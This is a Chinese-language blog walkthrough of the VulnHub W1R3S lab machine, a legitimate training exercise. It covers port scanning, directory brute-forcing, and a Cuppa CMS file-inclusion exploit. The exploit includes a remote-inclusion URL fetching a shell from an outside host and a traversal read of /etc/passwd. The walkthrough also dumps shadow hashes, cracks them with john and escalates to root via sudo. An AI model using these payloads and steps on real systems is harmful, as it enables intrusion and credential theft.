---
title: vulnhub-w1r3s通关
date: 2023-06-03 10:30:35
tags:
  - vulnhub
  - w1r3s
  - WriteUp
categories: WriteUp
keywords: vulnhub
description: 本文记录了作者在通关vulnhub靶机w1r3s中遇到的问题，通过目录爆破获取着手点，使用RFI获取敏感信息，爆破密码获得登录凭据。
top_img: https://pic.imgdb.cn/item/647dcd281ddac507ccf5125c.jpg
cover: https://pic.imgdb.cn/item/647dcd281ddac507ccf5125c.jpg
---
## 靶机详情

靶机IP：192.168.118.134

>You have been hired to do a penetration test on the W1R3S.inc individual server and report all findings. They have asked you to gain root access and find the flag (located in /root directory).
## 信息收集

### nmap 扫描

按照常规的方法：使用Nmap对靶机进行扫描，通过 TCP 、 UDP 扫描端口、获取开放端口对应信息、系统版本信息。

下面是通过 TCP 、UDP 扫描发现的开放端口信息：

```
$ sudo nmap -sT --min-rate 10000 -p- 192.168.118.134 -oA nmapscan/portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 09:59 EDT
Nmap scan report for 192.168.118.134
Host is up (0.0038s latency).
Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 00:0C:29:AA:7F:FC (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds
       
$ sudo nmap -sT -sV -O --script=vuln --min-rate 10000 -p21,22,80,3306 192.168.118.134 -oA nmapscan/servscan     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 10:02 EDT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|   Hosts that seem down (vulnerable):
|_    224.0.0.251
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 35.35 seconds

$ sudo nmap -sU -sV --min-rate 10000 -p- 192.168.118.134 -oA nmapscan/udpscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 10:06 EDT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 0.73 seconds
```

通过TCP扫描发现靶机开了21，22，80，3306端口，对应的服务为 ftp ， ssh ， http ， mysql 。

此处先从漏洞更多，更好下手的 ftp ，http ， mysql 下手。

## 获取立足点
### 失败尝试：ftp服务

首先是 ftp 服务，通过 kali 自带的工具 tftp 能够匿名登录，但是因为信息不足，没办法利用。所以暂时搁置，等待更多信息以便利用。
### RFI获取敏感信息

```
$ dirsearch -u http://192.168.118.134               

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/192.168.118.134/_23-06-09_11-16-00.txt

Error Log: /home/kali/.dirsearch/logs/errors-23-06-09_11-16-00.log

Target: http://192.168.118.134/

[11:16:00] Starting: 
[11:16:13] 301 -  326B  - /administrator  ->  http://192.168.118.134/administrator/
[11:16:13] 302 -    7KB - /administrator/index.php  ->  installation/
[11:16:13] 302 -    7KB - /administrator/  ->  installation/
[11:16:24] 200 -   11KB - /index.html
[11:16:25] 301 -  323B  - /javascript  ->  http://192.168.118.134/javascript/
[11:16:44] 301 -    0B  - /wordpress/  ->  http://localhost/wordpress/
[11:16:45] 200 -    2KB - /wordpress/wp-login.php

Task Completed
```

保留可以利用的扫描结果，发现两个能够访问的页面 `/administrator/installation/` 和 `/wordpress/`，打开页面观察一下界面，搜索更多信息：

![WP图片](https://pic.imgdb.cn/item/653f28bec458853aefd05dc3.jpg)
![cuppa图片](https://pic.imgdb.cn/item/653f285fc458853aefcf519c.jpg)

发现 `cuppa` 默认进入安装界面，猜测此处可能存在利用点，于是使用 `searchsploit` 搜索 `exp` 脚本，发现 `cuppa` 在 `/alertConfigField.php` 存在 RFI （远程文件包含）漏洞，复制利用脚本到本地，修改 request 包。

```
$ searchsploit cuppa   

Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion| php/webapps/25971.txt
------------------------------------------------------------------------------
Shellcodes: No Results

$ searchsploit -m 25971.txt
  Exploit: Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
      URL: https://www.exploit-db.com/exploits/25971
     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt
    Codes: OSVDB-94101
 Verified: True
File Type: C++ source, ASCII text, with very long lines (876)
Copied to: /home/kali/Desktop/BoxWalk/Vulnhub/w1r3s/25971.txt

$ cat 25971.txt         

#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

直接使用GET请求发现没有回显。打开burp将数据包改为POST请求，成功获取敏感信息。

![POST](https://pic.imgdb.cn/item/653f55ffc458853aef632d07.jpg)

根据脚本使用文件包含漏洞，获取 `/etc/paswwd` 和 `/etc/shadow` 文件内容。

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false
mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false
```

```
root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
daemon:*:17379:0:99999:7:::
bin:*:17379:0:99999:7:::
sys:*:17379:0:99999:7:::
sync:*:17379:0:99999:7:::
games:*:17379:0:99999:7:::
man:*:17379:0:99999:7:::
lp:*:17379:0:99999:7:::
mail:*:17379:0:99999:7:::
news:*:17379:0:99999:7:::
uucp:*:17379:0:99999:7:::
proxy:*:17379:0:99999:7:::
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
backup:*:17379:0:99999:7:::
list:*:17379:0:99999:7:::
irc:*:17379:0:99999:7:::
gnats:*:17379:0:99999:7:::
nobody:*:17379:0:99999:7:::
systemd-timesync:*:17379:0:99999:7:::
systemd-network:*:17379:0:99999:7:::
systemd-resolve:*:17379:0:99999:7:::
systemd-bus-proxy:*:17379:0:99999:7:::
syslog:*:17379:0:99999:7:::
_apt:*:17379:0:99999:7:::
messagebus:*:17379:0:99999:7:::
uuidd:*:17379:0:99999:7:::
lightdm:*:17379:0:99999:7:::
whoopsie:*:17379:0:99999:7:::
avahi-autoipd:*:17379:0:99999:7:::
avahi:*:17379:0:99999:7:::
dnsmasq:*:17379:0:99999:7:::
colord:*:17379:0:99999:7:::
speech-dispatcher:!:17379:0:99999:7:::
hplip:*:17379:0:99999:7:::
kernoops:*:17379:0:99999:7:::
pulse:*:17379:0:99999:7:::
rtkit:*:17379:0:99999:7:::
saned:*:17379:0:99999:7:::
usbmux:*:17379:0:99999:7:::
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
sshd:*:17554:0:99999:7:::
ftp:*:17554:0:99999:7:::
mysql:!:17554:0:99999:7:::
```
### 暴力破解获取登录凭据  

使用 `john` 尝试对密码进行暴力破解

```
$ sudo john hashpasswd    
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
www-data         (www-data)     
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
computer         (w1r3s)  
……
```

获取密码之后，直接使用ssh进行连接，获取立足点。

```
$ ssh w1r3s@192.168.118.134  
The authenticity of host '192.168.118.134 (192.168.118.134)' can't be established.
ED25519 key fingerprint is SHA256:Bue5VbUKeMSJMQdicmcMPTCv6xvD7I+20Ki8Um8gcWM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.118.134' (ED25519) to the list of known hosts.
----------------------
Think this is the way?
----------------------
Well,........possibly.
----------------------
w1r3s@192.168.118.134's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

641 packages can be updated.
490 updates are security updates.

.....You made it huh?....
Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35
w1r3s@W1R3S:~$ whoami
w1r3s
w1r3s@W1R3S:~$ uname -a
Linux W1R3S 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
w1r3s@W1R3S:~$ sudo -l
[sudo] password for w1r3s: 
Matching Defaults entries for w1r3s on W1R3S.localdomain:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User w1r3s may run the following commands on W1R3S.localdomain:
    (ALL : ALL) ALL
w1r3s@W1R3S:~$ sudo /bin/bash
root@W1R3S:~# whoami
root
```

## 总结

总体而言，这个靶机比较简单，难点主要在于RFI获取文件时，不能直接照搬脚本的做法，需要灵活变通，将GET请求改为POST请求。作者在此浪费了比较多的时间，最后成功突破也属于是灵光一现。